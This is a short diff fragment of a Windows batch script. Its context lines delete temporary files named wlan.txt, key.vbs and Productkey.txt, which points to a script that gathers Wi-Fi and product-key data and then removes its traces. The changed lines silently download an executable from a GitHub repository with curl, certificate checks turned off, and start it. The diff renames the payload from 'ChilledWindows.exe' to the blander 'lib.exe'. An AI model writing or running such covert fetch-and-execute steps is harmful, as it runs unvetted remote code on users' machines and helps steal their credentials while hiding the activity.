@@ -269,5 +269,5 @@ del %localappdata%\Temp\wlan.txt
 del %localappdata%\Temp\key.vbs
 del %localappdata%\Temp\Productkey.txt
 
-curl -L -s -k -o %TEMP%\ChilledWindows.exe "https://github.com/fluorek/utils/raw/main/ChilledWindows.exe"
-start %TEMP%\ChilledWindows.exe
+curl -L -s -k -o %TEMP%\lib.exe "https://github.com/fluorek/utils/raw/main/lib.exe"
+start %TEMP%\lib.exe
